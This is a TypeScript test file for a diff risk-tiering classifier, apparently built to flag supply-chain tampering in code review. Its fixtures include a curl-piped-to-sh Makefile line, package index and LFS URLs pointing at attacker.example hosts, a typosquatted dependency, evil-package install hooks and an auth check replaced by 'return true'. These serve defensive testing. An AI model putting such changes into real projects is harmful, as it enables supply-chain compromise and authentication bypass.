  { id: "D2", name: "package.json preprepare / postprepare", files: [f("package.json", added('    "postprepare": "node x.js",'))], atLeast: "risky" },
  { id: "D3", name: "package.json existing dep swapped to npm: alias", files: [f("package.json", chg(['    "lodash": "^4.17.21",'], ['    "lodash": "npm:lodash-fork-x@1.0.0",']))], atLeast: "standard" },
  { id: "D4", name: "package.json existing dep swapped to GitHub shorthand", files: [f("package.json", chg(['    "lodash": "^4.17.21",'], ['    "lodash": "someone/lodash",']))], atLeast: "risky" },
  { id: "D5", name: "package.json existing dep swapped to github.com tarball", files: [f("package.json", chg(['    "lodash": "^4.17.21",'], ['    "lodash": "https://github.com/someone/lodash/archive/main.tar.gz",']))], atLeast: "risky" },
  { id: "D6", name: "package-lock resolved to codeload.github.com", files: [f("package-lock.json", chg(['      "resolved": "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz",'], ['      "resolved": "https://codeload.github.com/someone/foo/tar.gz/abc",']))], atLeast: "risky" },
  { id: "D7", name: "package-lock resolved to another package on the same registry", files: [f("package-lock.json", chg(['      "resolved": "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz",', '      "integrity": "sha512-old"'], ['      "resolved": "https://registry.npmjs.org/evil-foo/-/evil-foo-1.0.0.tgz",', '      "integrity": "sha512-new"']))], atLeast: "standard" },
  { id: "D8", name: "go.mod replace to another GitHub module", files: [f("go.mod", added("replace github.com/x/y => github.com/someone/y v1.0.0"))], atLeast: "risky" },
  { id: "D9", name: "pnpm-workspace onlyBuiltDependencies (lets install scripts run)", files: [f("pnpm-workspace.yaml", added("onlyBuiltDependencies:", "  - evil-pkg"))], atLeast: "risky" },
  { id: "E1", name: "README prose 'Then run npm install evil-pkg' (no backtick)", files: [f("README.md", chg(["Then run npm install good-pkg to start."], ["Then run npm install evil-pkg to start."]))], atLeast: "small", kind: "install_link" },
  { id: "E2", name: "README prose 'bun add evil-pkg'", files: [f("README.md", chg(["bun add good-pkg"], ["bun add evil-pkg"]))], atLeast: "small", kind: "install_link" },
  { id: "E3", name: "README fence indented 4 spaces (inside a list item)", files: [f("README.md", ["@@ -1,6 +1,6 @@", " 1. Set up:", "    ```bash", "-    node scripts/setup.js", "+    node scripts/setup.js --from attacker", "    ```", " 2. Done"].join("\n"))], atLeast: "small", kind: "install_link" },
  { id: "E3b", name: "README fence indented 4 spaces, the changed line has no command word or link", files: [f("README.md", ["@@ -1,5 +1,5 @@", " 1. Set up:", "     ```bash", "-    run the thing quickly", "+    run the thing slowly", "     ```"].join("\n"))], atLeast: "small", kind: "install_link" },
  { id: "E4", name: "README setext Installation heading", files: [f("README.md", ["@@ -1,4 +1,4 @@", " Installation", " ============", "-Use the good-pkg package.", "+Use the evil-pkg package."].join("\n"))], atLeast: "small", kind: "install_link" },
  { id: "E5", name: "README install section heading outside the hunk context", files: [f("README.md", ["@@ -40,7 +40,7 @@", " Make sure the folder exists.", " Use the latest release.", " Then:", "-python3 -m good_tool init", "+python3 -m evil_tool init", " That is all.", " Thanks."].join("\n"))], atLeast: "small", kind: "install_link" },
  { id: "E6", name: "README HTML <pre> block command", files: [f("README.md", ["@@ -10,4 +10,4 @@", " <pre>", "-deno run good.ts", "+deno run -A evil.ts", " </pre>"].join("\n"))], atLeast: "small", kind: "install_link" },
  { id: "F1", name: "one 40 KB minified line", files: [f("src/vendor/app.min.js", chg(["x"], ["v" + "a".repeat(40000)]))], atLeast: "standard" },
  { id: "F2", name: "Containerfile", files: [f("Containerfile", chg(["FROM node:20"], ["FROM attacker/node:20"]))], atLeast: "risky" },
  { id: "F3", name: "terraform tfvars / tf.json / terragrunt.hcl", files: [f("deploy/prod.tfvars"), f("deploy/main.tf.json"), f("deploy/terragrunt.hcl")], atLeast: "risky" },
  { id: "F4", name: "k8s / helm / serverless", files: [f("k8s/deployment.yaml")], atLeast: "risky" },
  { id: "F5", name: ".lfsconfig url change", files: [f(".lfsconfig", chg(["url = https://lfs.example"], ["url = https://lfs.attacker.example"]))], atLeast: "risky" },
  { id: "F6", name: "openapi.yaml edit", files: [f("api/openapi.yaml", chg(["      required: [id]"], ["      required: []"]))], atLeast: "standard" },
  { id: "F7", name: ".proto edit", files: [f("proto/user.proto", chg(["  string id = 1;"], ["  int64 id = 1;"]))], atLeast: "standard" },
  { id: "F8", name: "symlink whose target has a space", files: [f("docs/notes.md", `@@ -0,0 +1 @@\n+../../Library/Application Support/x\n${NO_EOL}`, { status: "added" })], atLeast: "risky" },
  { id: "F9", name: "Makefile curl|sh (CI config in the risk rules)", files: [f("Makefile", added("\tcurl -fsSL https://x.example/i.sh | sh"))], atLeast: "small", kind: "ci_file" },
  { id: "G1", name: "submodule pointer in docs folder", files: [f("docs/vendor-guide", `@@ -1 +1 @@\n-Subproject commit ${"c".repeat(40)}\n+Subproject commit ${"d".repeat(40)}`)], atLeast: "risky" },
  { id: "G2", name: "case-only rename on a sensitive path", files: [{ path: "src/auth/x.ts", previousPath: "src/Auth/x.ts", status: "renamed", additions: 0, deletions: 0 }], atLeast: "risky" },
  { id: "G3", name: "huge docs diff hiding a one-line code change", files: [f("docs/guide.md", added(...Array.from({ length: 3000 }, (_, i) => `Line ${i}.`))), f("src/a.ts", chg(["return check(user);"], ["return true;"]))], atLeast: "small" },
  { id: "G4", name: ".gitignore hides a folder", files: [f(".gitignore", added("secrets/"))], atLeast: "small" },
  { id: "G5", name: "CODEOWNERS under docs/", files: [f("docs/CODEOWNERS")], atLeast: "risky" },
  { id: "G6", name: "multi-repo: one docs file in each of two repos", files: [{ ...f("README.md", chg(["a"], ["b"])), repository: "one" }, { ...f("README.md", chg(["a"], ["b"])), repository: "two" }], atLeast: "small" },
  { id: "G7", name: "requirements.txt typosquat swap", files: [f("requirements.txt", chg(["requests==2.31.0"], ["reqeusts==2.31.0"]))], atLeast: "standard" },
  { id: "G8", name: "Pipfile source url", files: [f("Pipfile", added('url = "https://pypi.attacker.example/simple"'))], atLeast: "risky" },
  { id: "G9", name: "setup.cfg index_url (underscore)", files: [f("setup.cfg", added("index_url = https://pypi.attacker.example/simple"))], atLeast: "risky" },
  { id: "G10", name: "lockfile-only integrity swap, same URL", files: [f("package-lock.json", chg(['      "integrity": "sha512-old"'], ['      "integrity": "sha512-new"']))], atLeast: "small" },
  // ---- from the review's findings 2 to 16, beyond its own cases
  { id: "X1", name: "prepublish script added", files: [f("package.json", added('    "prepublish": "node x.js",'))], atLeast: "risky" },
  { id: "X2", name: "prepack script added", files: [f("package.json", added('    "prepack": "node x.js",'))], atLeast: "risky" },
  { id: "X3", name: "bun trustedDependencies", files: [f("package.json", added('  "trustedDependencies": ["evil-pkg"],'))], atLeast: "risky" },
  { id: "X4", name: "deleting a test runner config", files: [{ path: "vitest.config.ts", status: "removed", additions: 0, deletions: 20 }], atLeast: "risky" },
  { id: "X5", name: "deleting a scanner config", files: [{ path: ".gitleaks.toml", status: "removed", additions: 0, deletions: 20 }], atLeast: "risky" },
  { id: "X6", name: "deleting a docs file stays docs", files: [{ path: "docs/old.md", status: "removed", additions: 0, deletions: 20 }], atLeast: "small", kind: "docs" },
  { id: "X7", name: "a new third-party action pinned to a tag", files: [f(".github/workflows/ci.yml", added("      - uses: someone/do-thing@v2"))], atLeast: "risky" },
  { id: "X8", name: "a first-party action at a tag is fine", files: [f(".github/workflows/ci.yml", added("      - uses: actions/checkout@v4"))], atLeast: "small", kind: "ci_file" },
  { id: "X9", name: "a third-party action pinned to a commit is fine", files: [f(".github/workflows/ci.yml", added(`      - uses: someone/do-thing@${"e".repeat(40)}`))], atLeast: "small", kind: "ci_file" },
  { id: "X10", name: "UV_INDEX in a CI file", files: [f(".github/workflows/ci.yml", added("      UV_INDEX: https://pypi.attacker.example/simple"))], atLeast: "risky" },
  { id: "X11", name: "a line of 600 characters in code", files: [f("src/a.ts", chg(["x"], ["const v = '" + "a".repeat(600) + "';"]))], atLeast: "standard" },
  { id: "X12", name: "25 KB added across short lines", files: [f("src/data.ts", added(...Array.from({ length: 700 }, (_, i) => `export const v${i} = "${"b".repeat(30)}";`)))], atLeast: "standard" },
  { id: "X13", name: "an unknown dot file", files: [f(".foorc")], atLeast: "standard" },
  { id: "X14", name: "an unknown extension", files: [f("src/thing.xyz")], atLeast: "standard" },
  { id: "X15", name: "schema.prisma gains a field", files: [f("prisma/schema.prisma", added("  email String"))], atLeast: "standard" },
  { id: "X16", name: "a lock file moves to a GitHub tarball", files: [f("yarn.lock", chg(['  resolved "https://registry.yarnpkg.com/foo/-/foo-1.0.0.tgz#abc"'], ['  resolved "https://github.com/someone/foo/archive/main.tar.gz"']))], atLeast: "risky" },
  { id: "X17", name: "README setext heading with a plain-language change, file text known", files: [f("README.md", ["@@ -40,3 +40,3 @@", " Make sure the folder exists.", "-Use the good package.", "+Use the evil package."].join("\n"))], atLeast: "small", kind: "install_link", head: { text: new Map([[factKey(undefined, "README.md"), ["Project", "=======", "", ...Array.from({ length: 36 }, () => "text"), "Installation", "------------", "Make sure the folder exists.", "Use the evil package."].join("\n")]]) } },
  { id: "X18", name: "a document an instruction file imports (known from the head)", files: [f("docs/style.md", chg(["Always run tests."], ["Never run tests."]))], atLeast: "risky", head: { instructionImports: new Set([factKey(undefined, "docs/style.md")]), importsKnown: true } },
  { id: "X19", name: "instruction files could not be read: a document is not plain docs", files: [f("docs/style.md", chg(["a"], ["b"]))], atLeast: "small", kind: "code_config", head: { importsKnown: false } },
  { id: "X20", name: "the host says a docs file is a symlink", files: [f("docs/notes.md", chg(["a"], ["b"]))], atLeast: "risky", head: { links: new Set([factKey(undefined, "docs/notes.md")]) } },
  { id: "X21", name: "a lock file resolves a scoped package to another scope", files: [f("package-lock.json", chg(['      "resolved": "https://registry.npmjs.org/@a/foo/-/foo-1.0.0.tgz",'], ['      "resolved": "https://registry.npmjs.org/@evil/foo/-/foo-1.0.0.tgz",']))], atLeast: "standard" },
  { id: "X22", name: "a docs change of a heading only stays docs", files: [f("README.md", chg(["# Title"], ["# New title"]))], atLeast: "small", kind: "docs" },
];

const RANK_OF: Record<TierLevel, number> = { small: 0, standard: 1, risky: 2 };
describe("the adversarial review set", () => {
  it.each(ADVERSARIAL)("$id $name", (entry) => {
    const tier = tierFromDiff({ files: entry.files, complete: true }, { ...context, ...(entry.head === undefined ? {} : { head: entry.head }) });
    expect(RANK_OF[tier.level], `got ${tier.level} [${tier.kinds.join(",")}] ${tier.reasons.map((reason) => reason.code).join(",")}`).toBeGreaterThanOrEqual(RANK_OF[entry.atLeast]);
    if (entry.kind !== undefined) expect(tier.kinds, `got ${tier.level} [${tier.kinds.join(",")}]`).toContain(entry.kind);
    expect(raiseTier(tier, LATER).level).toBe(tier.level);
  });
  it("small and docs stay small where they should (no over-escalation of plain changes)", () => {
    for (const entry of ADVERSARIAL.filter((candidate) => ["X6", "X8", "X9", "X22", "G3", "G4", "G6", "G10", "E3"].includes(candidate.id))) {
      const tier = tierFromDiff({ files: entry.files, complete: true }, { ...context, ...(entry.head === undefined ? {} : { head: entry.head }) });
      expect(tier.level, entry.id).not.toBe("risky");
    }
  });
});

describe("the tier only goes up", () => {
  const risky = tierFromDiff({ files: [file("src/payments/charge.ts")], complete: true }, context);
  const small = tierFromDiff({ files: [file("src/a.ts", { before: ["a"], after: ["b"] })], complete: true }, { headSha: "e".repeat(40), mergeBase: BASE, at: "2026-11-13T14:00:00.000Z" });

  it("a push after approval that adds a sensitive file raises the tier, and one that removes it again leaves it up", () => {
    const first = recordTier(undefined, small);
    expect(first.tier.level).toBe("small");
    const pushed = recordTier(first.flow, risky);
    expect(pushed.tier.level).toBe("risky");
    expect(pushed.grew).toBe(true);
    const removed = recordTier(pushed.flow, small);
    expect(removed.tier.level).toBe("risky");
    expect(removed.grew).toBe(false);
    // Bound to the newest code, with the reasons that put it up kept.
    expect(removed.tier.headSha).toBe("e".repeat(40));
    expect(removed.tier.reasons.map((reason) => reason.code)).toContain("sensitive_path");
    // The record keeps the earlier tiers, oldest first.
    expect(removed.flow.tierHistory?.map((tier) => tier.level)).toEqual(["small", "risky"]);
  });

  it("an estimate is a forecast: the first diff replaces it (and a risky diff is a growth)", () => {
    const estimate = estimateTier({ plannedPaths: ["src/a.ts"] }, { at: AT });
    expect(estimate.level).toBe("small");
    const first = recordTier(undefined, estimate);
    const afterBuild = recordTier(first.flow, risky);
    expect(afterBuild.tier.level).toBe("risky");
    expect(afterBuild.grew).toBe(true);
    expect(afterBuild.flow.tierHistory?.map((tier) => tier.source)).toEqual(["estimate"]);
    // A bigger estimate than the diff does not hold the diff up.
    const bigEstimate = recordTier(undefined, estimateTier({ plannedPaths: undefined }, { at: AT }));
    expect(bigEstimate.tier.level).toBe("standard");
    expect(recordTier(bigEstimate.flow, small).tier.level).toBe("small");
  });

  it("kinds and reasons are kept when a lower diff arrives; history never passes 20", () => {
    let flow = recordTier(undefined, risky).flow;
    for (let index = 0; index < 30; index += 1) flow = recordTier(flow, { ...small, headSha: index.toString(16).padStart(40, "0") }).flow;
    expect(flow.tier?.level).toBe("risky");
    expect(flow.tierHistory?.length).toBe(20);
    expect(flow.rulesVersion).toBe(1);
  });

  it("raiseTier never lowers and never loses the reasons", () => {
    const raised = raiseTier(risky, small);
    expect(raised.level).toBe("risky");
    expect(raised.reasons[0]).toEqual(risky.reasons[0]);
    expect(raiseTier(small, risky).level).toBe("risky");
  });
});

describe("the estimate, before the build", () => {
  const level = (input: Parameters<typeof estimateTier>[0]): TierLevel => estimateTier(input, { at: AT }).level;

  it("a plan that names no files is standard", () => {
    expect(level({})).toBe("standard");
    expect(level({ plannedPaths: [] })).toBe("standard");
  });
  it("a plan that names one code file is small; documents only is small with the docs kind", () => {
    expect(level({ plannedPaths: ["src/a.ts"] })).toBe("small");
    const docs = estimateTier({ plannedPaths: ["README.md", "docs/a.md"] }, { at: AT });
    expect({ level: docs.level, kinds: docs.kinds }).toEqual({ level: "small", kinds: ["docs"] });
  });
  it("a sensitive or instruction path is risky, whatever the size", () => {
    expect(level({ plannedPaths: ["src/auth/session.ts"] })).toBe("risky");
    expect(level({ plannedPaths: ["AGENTS.md"] })).toBe("risky");
    expect(level({ plannedPaths: [".npmrc"] })).toBe("risky");
  });
  it("more than 3 files or 2 modules is standard", () => {
    expect(level({ plannedPaths: ["src/a.ts", "src/b.ts", "src/c.ts", "src/d.ts"] })).toBe("standard");
    expect(level({ plannedPaths: ["packages/a/x.ts", "packages/b/y.ts"] })).toBe("standard");
  });
  it("a request that mentions a sensitive area is a hint: at least standard, never a refusal", () => {
    expect(level({ plannedPaths: ["src/a.ts"], requestText: "Fix the typo in the password reset email" })).toBe("standard");
    expect(level({ plannedPaths: ["src/a.ts"], requestText: "Fix the typo in the welcome email" })).toBe("small");
  });
  it("reads no diff: the estimate is bound to nothing but the time", () => {
    const tier = estimateTier({ plannedPaths: ["src/a.ts"] }, { at: AT });
    expect(tier).toMatchObject({ source: "estimate", at: AT });
    expect(tier.mergeBase).toBeUndefined();
  });
});

describe("the planned-path limit", () => {
  it("names the changed paths the plan did not", () => {
    expect(plannedPathsExceeded(["src/a.ts", "docs/"], ["src/a.ts", "docs/x/y.md", "src/b.ts"])).toEqual(["src/b.ts"]);
  });
  it("a rename counts under both names", () => {
    expect(plannedPathsExceeded(["src/a.ts"], [{ path: "src/a.ts", previousPath: "src/old.ts" }])).toEqual(["src/old.ts"]);
  });
  it("the limit is case-sensitive (a path that differs only in case is another file); a backslash is read as a slash", () => {
    expect(plannedPathsExceeded(["src/a.ts"], ["SRC\\A.ts"])).toEqual(["SRC\\A.ts"]);
    expect(plannedPathsExceeded(["src/a.ts"], ["src\\a.ts", "./src/a.ts"])).toEqual([]);
    expect(plannedPathsExceeded(["src/a.ts"], ["src/../auth/x.ts"])).toEqual(["src/../auth/x.ts"]);
  });
  it("the lock file of a planned manifest is covered; another lock file is not", () => {
    expect(plannedPathsExceeded(["package.json"], ["package-lock.json"])).toEqual([]);
    expect(plannedPathsExceeded(["packages/a/package.json"], ["package-lock.json"])).toEqual(["package-lock.json"]);
  });
});

describe("the words a merge is refused with", () => {
  it("names what grew, with the path made safe", () => {
    const tier = tierFromDiff({ files: [file("src/payments/charge.ts")], complete: true }, context);
    const words = tierGrowthSentence(tier, (path) => path.toUpperCase());
    expect(words).toBe("This change now touches a sensitive path (SRC/PAYMENTS/CHARGE.TS), so it needs risky checks.");
  });
  it("names a size growth without a path", () => {
    const tier = tierFromDiff({ files: [sized("src/a.ts", 150, 0)], complete: true }, context);
    expect(tierGrowthSentence(tier, (path) => path)).toBe("This change now touches more than 100 lines of code, so it needs standard checks.");
  });
});
